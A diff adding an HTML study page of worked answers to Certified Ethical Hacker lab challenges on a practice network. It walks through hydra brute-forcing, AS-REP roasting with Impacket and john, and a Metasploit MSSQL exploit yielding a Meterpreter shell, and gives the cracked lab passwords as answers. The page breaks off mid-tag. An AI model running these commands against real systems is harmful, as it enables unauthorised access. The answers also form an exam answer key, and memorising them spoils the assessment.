@@ -1,0 +1,723 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CEH Engage - Part 2</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 111, 200, 0.09);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(232, 242, 250, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2803addf-00cb-8024-a81b-dd2d17507ae0" class="page sans"><header><h1 class="page-title">CEH Engage - Part 2</h1><p class="page-description"></p></header><div class="page-body"><p id="2803addf-00cb-8082-ae11-ff769c09979c" class="">
+</p><p id="2803addf-00cb-8007-88d8-dd27f77556d9" class="">System Hacking</p><p id="2803addf-00cb-80c1-bbe6-f5ba82386db0" class="">Malware Threats</p><p id="2803addf-00cb-8045-97e9-f8c65bb17f14" class="">Sniffing</p><p id="2803addf-00cb-808f-b83a-dfb015133cd4" class="">Social Engineering</p><p id="2803addf-00cb-8035-9cf3-f9ab39ba3423" class="">Denial-of-Service</p><p id="2803addf-00cb-8012-ad7e-f92e5e22adb8" class="">
+</p><ol type="1" id="2803addf-00cb-80fd-9c57-e1346878be6b" class="numbered-list" start="1"><li>You are assigned to perform brute-force attack on a linux machine from 192.168.10.0/24 subnet and crack the FTP credentials of user nick. An exploitation information file is saved in the home directory of the FTP server. Determine the Vendor homepage of the FTP vulnerability specified in the file. (Format: aaaaa://aaa.aaaaaaaa.aaa/)</li></ol><p id="2803addf-00cb-801d-aa9e-f97124bbc5a7" class="">Explanation: <div class="indented"><p id="2803addf-00cb-8084-8f9d-f290ba64f260" class="">Determine hosts with open port 21 (FTP): <em><strong>nmap -p 21 -A --open &lt;target subnet&gt;</strong></em></p><p id="2803addf-00cb-808e-be38-c3e39c097b26" class="">Determine Linux host either via nmap or TTL ≤ 64</p><p id="2803addf-00cb-805f-afad-c46520ec3155" class=""><em><strong>hydra -l nick -P password.txt ftp://192.168.10.111</strong></em></p><p id="2803addf-00cb-8010-a3ca-fca1164322d7" class=""><em><strong>ftp &lt;target IP&gt; &gt; </strong></em>enter UN/PW</p><p id="2803addf-00cb-80f0-9bb4-e9b6ca81224e" class=""><em><strong>get &lt;filename&gt; </strong></em>(here <em><strong>get 52012.py</strong></em>) - This will download file to desktop of VM</p></div></p><p id="2803addf-00cb-80ed-8c33-c2f492f67fd2" class="">Answer: <div class="indented"><p id="2803addf-00cb-803b-8c70-fa7bbe19e5c5" class="">https://www.crushftp.com/</p></div></p><p id="2803addf-00cb-80cf-ba7e-f3e687bf63da" class="">
+</p><ol type="1" id="2803addf-00cb-8095-9354-dc120f82ebbb" class="numbered-list" start="2"><li>An intruder performed network sniffing on a machine from 192.168.10.0/24 subnet and obtained login credentials of the user for <a href="http://moviescope.com/">moviescope.com</a> website using remote packet capture in wireshark. You are assigned to analyse the Mscredremote.pcapng file located in Downloads folder of EH Workstation-1 and determine the credentials obtained. (Format: aaaa/aaaaa)</li></ol><p id="2803addf-00cb-8041-9343-c41ae891844c" class="">Explanation: <div class="indented"><p id="2803addf-00cb-8044-a0ff-c38a4029b8b9" class=""><em><strong>http.request.method == POST </strong></em></p></div></p><figure id="2803addf-00cb-8079-b765-d2deb7903ac4" class="image" style="text-align:left"><a href="image%2098.png"><img style="width:672px" src="image%2098.png"/></a></figure><p id="2803addf-00cb-8069-b0c9-c4a19ae5a0b5" class="">Answer: <div class="indented"><p id="2803addf-00cb-8011-b426-e2dd96c3b20b" class="">kety/apple</p></div></p><p id="2803addf-00cb-8047-926d-e30eaa6ab6f4" class="">
+</p><ol type="1" id="2803addf-00cb-80ac-97f3-d4243cf3c5ea" class="numbered-list" start="3"><li>You are assigned to analyse a packet capture file ServerDoS.pcapng located in Downloads folder of EH Workstation-2 machine. Determine the UDP based application layer protocol which attacker employed to flood the machine in targeted network.<br/>Note: Check for target Destination port. (Format: Aaaaa Aaaaaaa Aaaaaaaa)</li></ol><p id="2803addf-00cb-800c-bddf-c1d5f531dff0" class="">Explanation:<div class="indented"><p id="2803addf-00cb-80cf-95ad-d600be7ec98b" class="">Destination port is 26000 - Used for Quake Network Protocol </p></div></p><p id="2803addf-00cb-8027-bac0-c152a445bc36" class="">Answer:<div class="indented"><p id="2803addf-00cb-809e-b465-c41fbbce41b8" class="">Quake Network Protocol   </p></div></p><p id="2803addf-00cb-80ca-92ad-f86e3d61f131" class="">
+</p><ol type="1" id="2803addf-00cb-8053-b7fc-eabe7acc5db1" class="numbered-list" start="4"><li>A severe DDoS attack is occurred in an organization, degrading the performance of a ubuntu server machine in the SKILL.CEH network. You are assigned to analyse the DD_attack.pcapng file stored in Documents folder of EH workstation -2 and determine the IP address of the attacker trying to attack the target server through UDP. (Format: NNN.NNN.NN.NNN)</li></ol><p id="2803addf-00cb-8020-b109-c8294b169728" class="">Explanation: <div class="indented"><p id="2803addf-00cb-8010-9724-ea58ab761fc8" class="">Filter on <em><strong>udp </strong></em></p></div></p><p id="2803addf-00cb-80d4-a3d1-df7dc7239799" class="">Answer: </p><p id="2803addf-00cb-8089-9b03-d96eb224d7b2" class="">Source IP - 192.168.10.144</p><p id="2803addf-00cb-8064-80b0-ea991af6bb55" class="">
+</p><ol type="1" id="2803addf-00cb-8064-9c46-d35c57482ac8" class="numbered-list" start="5"><li>You are assigned to analyse PyD_attack.pcapng file stored in Downloads folder of EH Workstation -2 machine. Determine the attacker IP machine which is targeting the RPC service of the target machine. (Format: NNN.NN.NN.NN)</li></ol><p id="2803addf-00cb-80d4-a305-ec2a58cdad65" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80b6-a690-c5e235172970" class="">3 hosts on the 192.168.10.0/24 network have port 135 open for RPC</p><p id="2803addf-00cb-8044-8e24-c8bdd34b2a3d" class="">In wireshark: Statistics&gt;Conversations&gt;TCP Tab - Shows SRC and DES IP by Port (here port 135)</p><p id="2803addf-00cb-806e-b453-f3344d82f9fa" class="">Or <em><strong>filter tcp.port ==135</strong></em></p></div></p><p id="2803addf-00cb-8065-9789-eb0bc14573f1" class="">Answer: <div class="indented"><p id="2803addf-00cb-80a0-b156-da82ab00241d" class="">172.30.10.99</p></div></p><p id="2803addf-00cb-8045-95bd-e0f5c4db95cd" class="">
+</p><ol type="1" id="2803addf-00cb-80a1-ad4f-f4e3a4a2999b" class="numbered-list" start="6"><li>An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the reports submitted by the IH team which are stored in &quot;C:\Users\Admin\Documents\Anti-DDoS&quot; directory of the EH Workstation-1 and determine the attacker IP which has transmitted more number of packets to the target machine. (Format: NNN.NNN.NN.NNN)</li></ol><p id="2803addf-00cb-802a-b31f-c7da0c8404a4" class="">????</p><p id="2803addf-00cb-80f7-be2b-ca2231894b50" class="">
+</p><ol type="1" id="2803addf-00cb-800c-87ab-f72fe6bf5e96" class="numbered-list" start="7"><li>You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: aNaaN*NNN)</li></ol><p id="2803addf-00cb-80f5-b0b0-c05e025b1e67" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80a0-9159-d19d8b99e227" class="">Note: Impacket dir is located in root dir (copying this dir to desktop makes things easier)</p><p id="2803addf-00cb-802d-858b-fb85596105f3" class=""><em><strong>python3 GetNPUsers.py &lt;target domain (ex. SKILL.CEH)&gt;/ -no-pass -usersfile &lt;username list file path&gt; -dc-ip &lt;DC IP address&gt;</strong></em></p><p id="2803addf-00cb-804d-ac87-ce854565909b" class="">Note: Domain name is NetBIOS_DOMAIN_NAME: SKILL.CEH</p><p id="2803addf-00cb-8031-a20b-eab59f7cb658" class=""><em><strong>echo ‘[hash value]’ &gt; joshuahash.txt </strong></em>to copy hash value to .txt file (copy entire hash value from left of first $) </p><p id="2803addf-00cb-80db-a0e1-db4890752f99" class=""><em><strong>john --wordlist=&lt;password list path&gt; joshuahash.txt</strong></em></p></div></p><p id="2803addf-00cb-80f6-a0af-e329a6759a93" class="">Answer: <div class="indented"><p id="2803addf-00cb-80c7-b55f-e08b3025e41a" class="">c3ll0@123</p><p id="2803addf-00cb-8031-92e2-c10b26c92a4f" class="">
+</p></div></p><ol type="1" id="2803addf-00cb-8022-9b2d-ef3ccceb2aac" class="numbered-list" start="8"><li>A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)</li></ol><p id="2803addf-00cb-80e0-93d6-d54eaf13e6b3" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80ee-82b5-dcbeb1946bc2" class=""><em><strong>nmap -p 1433 -A -v 192.168.10.*</strong></em> to scan subnet for open mssql service (SQL Server) - here 192.168.10.144</p><p id="2803addf-00cb-8057-8aa0-ce94fc298505" class=""><em><strong>hydra -L &lt;username.txt&gt; -P &lt;password.txt&gt; &lt;target IP&gt; mssql </strong></em></p><p id="2803addf-00cb-80d7-a1d0-c5cdba0d55df" class="">Note UN and PW (here Server_mssrv/Spidy)<br/>Attempt to log into the service using <strong>mssqlclient.py: </strong><em><strong>python3 /root/impacket/examples/mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433</strong></em></p><p id="2803addf-00cb-8045-9a98-cef47541e5e9" class="">Note database name (new) </p><ol type="1" id="2803addf-00cb-80dc-bffd-fac8cb29cfab" class="numbered-list" start="1"><li>Launch metasploit<ol type="a" id="2803addf-00cb-80ee-b7de-ff4db6ed6f64" class="numbered-list" start="1"><li><em><strong>msfconsole</strong></em></li></ol><ol type="a" id="2803addf-00cb-80a7-a841-d04ba87417df" class="numbered-list" start="2"><li><em><strong>use exploit/windows/mssql/mssql_payload</strong></em></li></ol><ol type="a" id="2803addf-00cb-805e-bbb0-e07a047d26b1" class="numbered-list" start="3"><li><em><strong>set RHOST &lt;target IP&gt; </strong></em></li></ol><ol type="a" id="2803addf-00cb-8028-8cff-de7ec7564c11" class="numbered-list" start="4"><li><em><strong>set USERNAME &lt;username obtained&gt;</strong></em></li></ol><ol type="a" id="2803addf-00cb-8081-873a-cd4db3a78bfc" class="numbered-list" start="5"><li><em><strong>set PASSWORD &lt;password obtained&gt; </strong></em></li></ol><ol type="a" id="2803addf-00cb-8013-b7bb-c074afcc46d5" class="numbered-list" start="6"><li><em><strong>set DATABASE &lt;database name obtained&gt;</strong></em></li></ol><ol type="a" id="2803addf-00cb-8084-970f-f2d52594af6e" class="numbered-list" start="7"><li><em><strong>exploit</strong></em></li></ol></li></ol><ol type="1" id="2803addf-00cb-80fd-ae24-f5a7494c0020" class="numbered-list" start="2"><li>Meterpreter session will open</li></ol><ol type="1" id="2803addf-00cb-8039-b771-daad9bf6cbd6" class="numbered-list" start="3"><li><em><strong>shell &gt; enter</strong></em></li></ol><ol type="1" id="2803addf-00cb-806b-933c-e11db1941aa6" class="numbered-list" start="4"><li><em><strong>cd \Users\Public\Downloads</strong></em></li></ol><ol type="1" id="2803addf-00cb-802b-8183-ea1c3b680c95" class="numbered-list" start="5"><li><em><strong>dir</strong></em></li></ol></div></p><p id="2803addf-00cb-809d-aa54-ddf57204d11c" class="">Answer: <div class="indented"><p id="2803addf-00cb-8079-98c0-f527764926ef" class="">7 </p></div></p><p id="2803addf-00cb-80ae-ad03-fe1d75665b9c" class="">
+</p><ol type="1" id="2803addf-00cb-8086-80e9-ddc2641a193c" class="numbered-list" start="9"><li>You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)</li></ol><p id="2803addf-00cb-80da-94d2-e26605363170" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80ec-b4e5-e5dc2b5413c1" class="">Scan network for open rdp service (Port 3389) </p><p id="2803addf-00cb-8009-927c-fce63c870d50" class=""><em><strong>hydra -L Maurice -P password.txt &lt;target IP&gt; rdp</strong></em></p></div></p><p id="2803addf-00cb-8069-bca5-c49bc7d1d822" class="">Answer: <div class="indented"><p id="2813addf-00cb-804e-8053-ea7ed9d8d941" class=""> Pumpkin@1234</p><p 